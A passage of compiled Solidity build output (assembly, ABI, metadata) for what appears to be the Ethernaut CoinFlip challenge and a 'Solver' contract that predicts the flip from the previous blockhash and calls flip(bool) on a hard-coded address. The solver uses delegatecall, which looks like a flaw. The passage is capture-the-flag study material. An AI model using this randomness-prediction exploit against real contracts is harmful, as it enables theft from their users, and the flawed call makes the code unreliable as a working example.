											"value": "[out]"
										},
										{
											"begin": 1723,
											"end": 1800,
											"name": "tag",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 1723,
											"end": 1800,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1760,
											"end": 1767,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1789,
											"end": 1794,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1778,
											"end": 1794,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1778,
											"end": 1794,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1723,
											"end": 1800,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1723,
											"end": 1800,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1723,
											"end": 1800,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1723,
											"end": 1800,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1806,
											"end": 2039,
											"name": "tag",
											"source": 1,
											"value": "25"
										},
										{
											"begin": 1806,
											"end": 2039,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1845,
											"end": 1848,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1868,
											"end": 1892,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "66"
										},
										{
											"begin": 1886,
											"end": 1891,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1868,
											"end": 1892,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 1868,
											"end": 1892,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1868,
											"end": 1892,
											"name": "tag",
											"source": 1,
											"value": "66"
										},
										{
											"begin": 1868,
											"end": 1892,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1859,
											"end": 1892,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1859,
											"end": 1892,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1914,
											"end": 1980,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1907,
											"end": 1912,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1904,
											"end": 1981,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 1901,
											"end": 2004,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1901,
											"end": 2004,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "67"
										},
										{
											"begin": 1901,
											"end": 2004,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1984,
											"end": 2002,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "68"
										},
										{
											"begin": 1984,
											"end": 2002,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "62"
										},
										{
											"begin": 1984,
											"end": 2002,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1984,
											"end": 2002,
											"name": "tag",
											"source": 1,
											"value": "68"
										},
										{
											"begin": 1984,
											"end": 2002,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1901,
											"end": 2004,
											"name": "tag",
											"source": 1,
											"value": "67"
										},
										{
											"begin": 1901,
											"end": 2004,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2031,
											"end": 2032,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 2024,
											"end": 2029,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2020,
											"end": 2033,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 2013,
											"end": 2033,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2013,
											"end": 2033,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 2039,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 2039,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 2039,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 2039,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2045,
											"end": 2225,
											"name": "tag",
											"source": 1,
											"value": "62"
										},
										{
											"begin": 2045,
											"end": 2225,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2093,
											"end": 2170,
											"name": "PUSH",
											"source": 1,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 2090,
											"end": 2091,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2083,
											"end": 2171,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 2190,
											"end": 2194,
											"name": "PUSH",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 2187,
											"end": 2188,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 2180,
											"end": 2195,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 2214,
											"end": 2218,
											"name": "PUSH",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 2211,
											"end": 2212,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2204,
											"end": 2219,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 2231,
											"end": 2411,
											"name": "tag",
											"source": 1,
											"value": "56"
										},
										{
											"begin": 2231,
											"end": 2411,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2279,
											"end": 2356,
											"name": "PUSH",
											"source": 1,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 2276,
											"end": 2277,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2269,
											"end": 2357,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 2376,
											"end": 2380,
											"name": "PUSH",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 2373,
											"end": 2374,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 2366,
											"end": 2381,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 2400,
											"end": 2404,
											"name": "PUSH",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 2397,
											"end": 2398,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2390,
											"end": 2405,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 2540,
											"end": 2657,
											"name": "tag",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 2540,
											"end": 2657,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2649,
											"end": 2650,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2646,
											"end": 2647,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 2639,
											"end": 2651,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 2663,
											"end": 2779,
											"name": "tag",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 2663,
											"end": 2779,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2733,
											"end": 2754,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "75"
										},
										{
											"begin": 2748,
											"end": 2753,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2733,
											"end": 2754,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 2733,
											"end": 2754,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 2733,
											"end": 2754,
											"name": "tag",
											"source": 1,
											"value": "75"
										},
										{
											"begin": 2733,
											"end": 2754,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2726,
											"end": 2731,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2723,
											"end": 2755,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 2713,
											"end": 2773,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "76"
										},
										{
											"begin": 2713,
											"end": 2773,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 2769,
											"end": 2770,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2766,
											"end": 2767,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 2759,
											"end": 2771,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 2713,
											"end": 2773,
											"name": "tag",
											"source": 1,
											"value": "76"
										},
										{
											"begin": 2713,
											"end": 2773,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2663,
											"end": 2779,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2663,
											"end": 2779,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"consecutiveWins()": "e6f334d7",
							"flip(bool)": "1d263f67"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.7+commit.e28d00a7\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"consecutiveWins\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_guess\",\"type\":\"bool\"}],\"name\":\"flip\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"ethernaut.sol\":\"CoinFlip\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"ethernaut.sol\":{\"keccak256\":\"0x50e8f91c4c392e6f6eefe354880502aec3d4cddae75bf67e46393971783785e1\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://5b52042c0f20ede8d9cd4d9d4a5fff04a9282df67ec2048c16349dcf5c6a63d5\",\"dweb:/ipfs/QmUmMFmuCCQC34mwaD9FfesMBYUnNV74tNh3MNPg1aeS5X\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 3,
								"contract": "ethernaut.sol:CoinFlip",
								"label": "consecutiveWins",
								"offset": 0,
								"slot": "0",
								"type": "t_uint256"
							},
							{
								"astId": 5,
								"contract": "ethernaut.sol:CoinFlip",
								"label": "lastHash",
								"offset": 0,
								"slot": "1",
								"type": "t_uint256"
							},
							{
								"astId": 8,
								"contract": "ethernaut.sol:CoinFlip",
								"label": "FACTOR",
								"offset": 0,
								"slot": "2",
								"type": "t_uint256"
							}
						],
						"types": {
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				},
				"Solver": {
					"abi": [
						{
							"inputs": [],
							"name": "solve",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"ethernaut.sol\":810:1367  contract Solver {\r... */\n  mstore(0x40, 0x80)\n    /* \"ethernaut.sol\":850:927  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x8000000000000000000000000000000000000000000000000000000000000000\n    /* \"ethernaut.sol\":833:927  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x00\n  sstore\n    /* \"ethernaut.sol\":957:999  0x1b4C3BB63058CE67b9573BEffcBF3737e1697F4F */\n  0x1b4c3bb63058ce67b9573beffcbf3737e1697f4f\n    /* \"ethernaut.sol\":934:999  address contractAddr = 0x1b4C3BB63058CE67b9573BEffcBF3737e1697F4F */\n  0x01\n  exp(0x0100, 0x00)\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"ethernaut.sol\":810:1367  contract Solver {\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"ethernaut.sol\":810:1367  contract Solver {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x890d6908\n      eq\n      tag_3\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"ethernaut.sol\":1026:1364  function solve() public returns (uint256) {\r... */\n    tag_3:\n      tag_4\n      tag_5\n      jump\t// in\n    tag_4:\n      mload(0x40)\n      tag_6\n      swap2\n      swap1\n      tag_7\n      jump\t// in\n    tag_6:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n    tag_5:\n        /* \"ethernaut.sol\":1059:1066  uint256 */\n      0x00\n        /* \"ethernaut.sol\":1079:1094  bool whatToSend */\n      dup1\n        /* \"ethernaut.sol\":1148:1149  1 */\n      0x01\n        /* \"ethernaut.sol\":1137:1143  FACTOR */\n      sload(0x00)\n        /* \"ethernaut.sol\":1131:1132  1 */\n      0x01\n        /* \"ethernaut.sol\":1116:1128  block.number */\n      number\n        /* \"ethernaut.sol\":1116:1132  block.number - 1 */\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n        /* \"ethernaut.sol\":1106:1133  blockhash(block.number - 1) */\n      blockhash\n        /* \"ethernaut.sol\":1098:1134  uint256(blockhash(block.number - 1)) */\n      0x00\n      shr\n        /* \"ethernaut.sol\":1098:1143  uint256(blockhash(block.number - 1)) / FACTOR */\n      tag_11\n      swap2\n      swap1\n      tag_12\n      jump\t// in\n    tag_11:\n        /* \"ethernaut.sol\":1097:1149  (uint256(blockhash(block.number - 1)) / FACTOR) == 1 */\n      eq\n        /* \"ethernaut.sol\":1079:1149  bool whatToSend = (uint256(blockhash(block.number - 1)) / FACTOR) == 1 */\n      swap1\n      pop\n        /* \"ethernaut.sol\":1175:1185  whatToSend */\n      dup1\n        /* \"ethernaut.sol\":1163:1185  previous == whatToSend */\n      iszero\n      iszero\n        /* \"ethernaut.sol\":1163:1171  previous */\n      0x01\n      0x14\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"ethernaut.sol\":1163:1185  previous == whatToSend */\n      iszero\n      iszero\n      eq\n        /* \"ethernaut.sol\":1160:1233  if(previous == whatToSend) {\r... */\n      iszero\n      tag_13\n      jumpi\n        /* \"ethernaut.sol\":1202:1221  revert(\"try again\") */\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_14\n      swap1\n      tag_15\n      jump\t// in\n    tag_14:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n        /* \"ethernaut.sol\":1160:1233  if(previous == whatToSend) {\r... */\n    tag_13:\n        /* \"ethernaut.sol\":1243:1255  contractAddr */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"ethernaut.sol\":1243:1268  contractAddr.delegatecall */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"ethernaut.sol\":1287:1310  keccak256(\"flip(bool)\") */\n      0x1d263f678198afcb61494c86d0b849d04a869f89e604450ae1a549aa6619dd3d\n        /* \"ethernaut.sol\":1312:1322  whatToSend */\n      dup3\n        /* \"ethernaut.sol\":1269:1323  abi.encode(bytes4(keccak256(\"flip(bool)\")),whatToSend) */\n      add(0x20, mload(0x40))\n      tag_16\n      swap3\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n        /* \"ethernaut.sol\":1243:1324  contractAddr.delegatecall(abi.encode(bytes4(keccak256(\"flip(bool)\")),whatToSend)) */\n      mload(0x40)\n      tag_18\n      swap2\n      swap1\n      tag_19\n      jump\t// in\n    tag_18:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      gas\n      delegatecall\n      swap2\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_22\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_21)\n    tag_22:\n      0x60\n      swap2\n      pop\n    tag_21:\n      pop\n      pop\n      pop\n        /* \"ethernaut.sol\":1346:1356  whatToSend */\n      dup1\n        /* \"ethernaut.sol\":1335:1343  previous */\n      0x01\n      0x14\n        /* \"ethernaut.sol\":1335:1356  previous = whatToSend */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"ethernaut.sol\":1068:1364  {\r... */\n      pop\n        /* \"ethernaut.sol\":1026:1364  function solve() public returns (uint256) {\r... */\n      swap1\n      jump\t// out\n        /* \"#utility.yul\":7:116   */\n    tag_24:\n        /* \"#utility.yul\":88:109   */\n      tag_26\n        /* \"#utility.yul\":103:108   */\n      dup2\n        /* \"#utility.yul\":88:109   */\n      tag_27\n      jump\t// in\n    tag_26:\n        /* \"#utility.yul\":83:86   */\n      dup3\n        /* \"#utility.yul\":76:110   */\n      mstore\n        /* \"#utility.yul\":7:116   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":122:237   */\n    tag_28:\n        /* \"#utility.yul\":207:230   */\n      tag_30\n        /* \"#utility.yul\":224:229   */\n      dup2\n        /* \"#utility.yul\":207:230   */\n      tag_31\n      jump\t// in\n    tag_30:\n        /* \"#utility.yul\":202:205   */\n      dup3\n        /* \"#utility.yul\":195:231   */\n      mstore\n        /* \"#utility.yul\":122:237   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":243:616   */\n    tag_32:\n        /* \"#utility.yul\":347:350   */\n      0x00\n        /* \"#utility.yul\":375:413   */\n      tag_34\n        /* \"#utility.yul\":407:412   */\n      dup3\n        /* \"#utility.yul\":375:413   */\n      tag_35\n      jump\t// in\n    tag_34:\n        /* \"#utility.yul\":429:517   */\n      tag_36\n        /* \"#utility.yul\":510:516   */\n      dup2\n        /* \"#utility.yul\":505:508   */\n      dup6\n        /* \"#utility.yul\":429:517   */\n      tag_37\n      jump\t// in\n    tag_36:\n        /* \"#utility.yul\":422:517   */\n      swap4\n      pop\n        /* \"#utility.yul\":526:578   */\n      tag_38\n        /* \"#utility.yul\":571:577   */\n      dup2\n        /* \"#utility.yul\":566:569   */\n      dup6\n        /* \"#utility.yul\":559:563   */\n      0x20\n        /* \"#utility.yul\":552:557   */\n      dup7\n        /* \"#utility.yul\":548:564   */\n      add\n        /* \"#utility.yul\":526:578   */\n      tag_39\n      jump\t// in\n    tag_38:\n        /* \"#utility.yul\":603:609   */\n      dup1\n        /* \"#utility.yul\":598:601   */\n      dup5\n        /* \"#utility.yul\":594:610   */\n      add\n        /* \"#utility.yul\":587:610   */\n      swap2\n      pop\n        /* \"#utility.yul\":351:616   */\n      pop\n        /* \"#utility.yul\":243:616   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":622:987   */\n    tag_40:\n        /* \"#utility.yul\":764:767   */\n      0x00\n        /* \"#utility.yul\":785:851   */\n      tag_42\n        /* \"#utility.yul\":849:850   */\n      0x09\n        /* \"#utility.yul\":844:847   */\n      dup4\n        /* \"#utility.yul\":785:851   */\n      tag_43\n      jump\t// in\n    tag_42:\n        /* \"#utility.yul\":778:851   */\n      swap2\n      pop\n        /* \"#utility.yul\":860:953   */\n      tag_44\n        /* \"#utility.yul\":949:952   */\n      dup3\n        /* \"#utility.yul\":860:953   */\n      tag_45\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":978:980   */\n      0x20\n        /* \"#utility.yul\":973:976   */\n      dup3\n        /* \"#utility.yul\":969:981   */\n      add\n        /* \"#utility.yul\":962:981   */\n      swap1\n      pop\n        /* \"#utility.yul\":622:987   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":993:1111   */\n    tag_46:\n        /* \"#utility.yul\":1080:1104   */\n      tag_48\n        /* \"#utility.yul\":1098:1103   */\n      dup2\n        /* \"#utility.yul\":1080:1104   */\n      tag_49\n      jump\t// in\n    tag_48:\n        /* \"#utility.yul\":1075:1078   */\n      dup3\n        /* \"#utility.yul\":1068:1105   */\n      mstore\n        /* \"#utility.yul\":993:1111   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1117:1388   */\n    tag_19:\n        /* \"#utility.yul\":1247:1250   */\n      0x00\n        /* \"#utility.yul\":1269:1362   */\n      tag_51\n        /* \"#utility.yul\":1358:1361   */\n      dup3\n        /* \"#utility.yul\":1349:1355   */\n      dup5\n        /* \"#utility.yul\":1269:1362   */\n      tag_32\n      jump\t// in\n    tag_51:\n        /* \"#utility.yul\":1262:1362   */\n      swap2\n      pop\n        /* \"#utility.yul\":1379:1382   */\n      dup2\n        /* \"#utility.yul\":1372:1382   */\n      swap1\n      pop\n        /* \"#utility.yul\":1117:1388   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1394:1710   */\n    tag_17:\n        /* \"#utility.yul\":1507:1511   */\n      0x00\n        /* \"#utility.yul\":1545:1547   */\n      0x40\n        /* \"#utility.yul\":1534:1543   */\n      dup3\n        /* \"#utility.yul\":1530:1548   */\n      add\n        /* \"#utility.yul\":1522:1548   */\n      swap1\n      pop\n        /* \"#utility.yul\":1558:1627   */\n      tag_53\n        /* \"#utility.yul\":1624:1625   */\n      0x00\n        /* \"#utility.yul\":1613:1622   */\n      dup4\n        /* \"#utility.yul\":1609:1626   */\n      add\n        /* \"#utility.yul\":1600:1606   */\n      dup6\n        /* \"#utility.yul\":1558:1627   */\n      tag_28\n      jump\t// in\n    tag_53:\n        /* \"#utility.yul\":1637:1703   */\n      tag_54\n        /* \"#utility.yul\":1699:1701   */\n      0x20\n        /* \"#utility.yul\":1688:1697   */\n      dup4\n        /* \"#utility.yul\":1684:1702   */\n      add\n        /* \"#utility.yul\":1675:1681   */\n      dup5\n        /* \"#utility.yul\":1637:1703   */\n      tag_24\n      jump\t// in\n    tag_54:\n        /* \"#utility.yul\":1394:1710   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1716:2135   */\n    tag_15:\n        /* \"#utility.yul\":1882:1886   */\n      0x00\n        /* \"#utility.yul\":1920:1922   */\n      0x20\n        /* \"#utility.yul\":1909:1918   */\n      dup3\n        /* \"#utility.yul\":1905:1923   */\n      add\n        /* \"#utility.yul\":1897:1923   */\n      swap1\n      pop\n        /* \"#utility.yul\":1969:1978   */\n      dup2\n        /* \"#utility.yul\":1963:1967   */\n      dup2\n        /* \"#utility.yul\":1959:1979   */\n      sub\n        /* \"#utility.yul\":1955:1956   */\n      0x00\n        /* \"#utility.yul\":1944:1953   */\n      dup4\n        /* \"#utility.yul\":1940:1957   */\n      add\n        /* \"#utility.yul\":1933:1980   */\n      mstore\n        /* \"#utility.yul\":1997:2128   */\n      tag_56\n        /* \"#utility.yul\":2123:2127   */\n      dup2\n        /* \"#utility.yul\":1997:2128   */\n      tag_40\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":1989:2128   */\n      swap1\n      pop\n        /* \"#utility.yul\":1716:2135   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2141:2363   */\n    tag_7:\n        /* \"#utility.yul\":2234:2238   */\n      0x00\n        /* \"#utility.yul\":2272:2274   */\n      0x20\n        /* \"#utility.yul\":2261:2270   */\n      dup3\n        /* \"#utility.yul\":2257:2275   */\n      add\n        /* \"#utility.yul\":2249:2275   */\n      swap1\n      pop\n        /* \"#utility.yul\":2285:2356   */\n      tag_58\n        /* \"#utility.yul\":2353:2354   */\n      0x00\n        /* \"#utility.yul\":2342:2351   */\n      dup4\n        /* \"#utility.yul\":2338:2355   */\n      add\n        /* \"#utility.yul\":2329:2335   */\n      dup5\n        /* \"#utility.yul\":2285:2356   */\n      tag_46\n      jump\t// in\n    tag_58:\n        /* \"#utility.yul\":2141:2363   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2369:2467   */\n    tag_35:\n        /* \"#utility.yul\":2420:2426   */\n      0x00\n        /* \"#utility.yul\":2454:2459   */\n      dup2\n        /* \"#utility.yul\":2448:2460   */\n      mload\n        /* \"#utility.yul\":2438:2460   */\n      swap1\n      pop\n        /* \"#utility.yul\":2369:2467   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2473:2620   */\n    tag_37:\n        /* \"#utility.yul\":2574:2585   */\n      0x00\n        /* \"#utility.yul\":2611:2614   */\n      dup2\n        /* \"#utility.yul\":2596:2614   */\n      swap1\n      pop\n        /* \"#utility.yul\":2473:2620   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2626:2795   */\n    tag_43:\n        /* \"#utility.yul\":2710:2721   */\n      0x00\n        /* \"#utility.yul\":2744:2750   */\n      dup3\n        /* \"#utility.yul\":2739:2742   */\n      dup3\n        /* \"#utility.yul\":2732:2751   */\n      mstore\n        /* \"#utility.yul\":2784:2788   */\n      0x20\n        /* \"#utility.yul\":2779:2782   */\n      dup3\n        /* \"#utility.yul\":2775:2789   */\n      add\n        /* \"#utility.yul\":2760:2789   */\n      swap1\n      pop\n        /* \"#utility.yul\":2626:2795   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2801:2986   */\n    tag_12:\n        /* \"#utility.yul\":2841:2842   */\n      0x00\n        /* \"#utility.yul\":2858:2878   */\n      tag_63\n        /* \"#utility.yul\":2876:2877   */\n      dup3\n        /* \"#utility.yul\":2858:2878   */\n      tag_49\n      jump\t// in\n    tag_63:\n        /* \"#utility.yul\":2853:2878   */\n      swap2\n      pop\n        /* \"#utility.yul\":2892:2912   */\n      tag_64\n        /* \"#utility.yul\":2910:2911   */\n      dup4\n        /* \"#utility.yul\":2892:2912   */\n      tag_49\n      jump\t// in\n    tag_64:\n        /* \"#utility.yul\":2887:2912   */\n      swap3\n      pop\n        /* \"#utility.yul\":2931:2932   */\n      dup3\n        /* \"#utility.yul\":2921:2956   */\n      tag_65\n      jumpi\n        /* \"#utility.yul\":2936:2954   */\n      tag_66\n      tag_67\n      jump\t// in\n    tag_66:\n        /* \"#utility.yul\":2921:2956   */\n    tag_65:\n        /* \"#utility.yul\":2978:2979   */\n      dup3\n        /* \"#utility.yul\":2975:2976   */\n      dup3\n        /* \"#utility.yul\":2971:2980   */\n      div\n        /* \"#utility.yul\":2966:2980   */\n      swap1\n      pop\n        /* \"#utility.yul\":2801:2986   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2992:3183   */\n    tag_10:\n        /* \"#utility.yul\":3032:3036   */\n      0x00\n        /* \"#utility.yul\":3052:3072   */\n      tag_69\n        /* \"#utility.yul\":3070:3071   */\n      dup3\n        /* \"#utility.yul\":3052:3072   */\n      tag_49\n      jump\t// in\n    tag_69:\n        /* \"#utility.yul\":3047:3072   */\n      swap2\n      pop\n        /* \"#utility.yul\":3086:3106   */\n      tag_70\n        /* \"#utility.yul\":3104:3105   */\n      dup4\n        /* \"#utility.yul\":3086:3106   */\n      tag_49\n      jump\t// in\n    tag_70:\n        /* \"#utility.yul\":3081:3106   */\n      swap3\n      pop\n        /* \"#utility.yul\":3125:3126   */\n      dup3\n        /* \"#utility.yul\":3122:3123   */\n      dup3\n        /* \"#utility.yul\":3119:3127   */\n      lt\n        /* \"#utility.yul\":3116:3150   */\n      iszero\n      tag_71\n      jumpi\n        /* \"#utility.yul\":3130:3148   */\n      tag_72\n      tag_73\n      jump\t// in\n    tag_72:\n        /* \"#utility.yul\":3116:3150   */\n    tag_71:\n        /* \"#utility.yul\":3175:3176   */\n      dup3\n        /* \"#utility.yul\":3172:3173   */\n      dup3\n        /* \"#utility.yul\":3168:3177   */\n      sub\n        /* \"#utility.yul\":3160:3177   */\n      swap1\n      pop\n        /* \"#utility.yul\":2992:3183   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3189:3279   */\n    tag_27:\n        /* \"#utility.yul\":3223:3230   */\n      0x00\n        /* \"#utility.yul\":3266:3271   */\n      dup2\n        /* \"#utility.yul\":3259:3272   */\n      iszero\n        /* \"#utility.yul\":3252:3273   */\n      iszero\n        /* \"#utility.yul\":3241:3273   */\n      swap1\n      pop\n        /* \"#utility.yul\":3189:3279   */\n  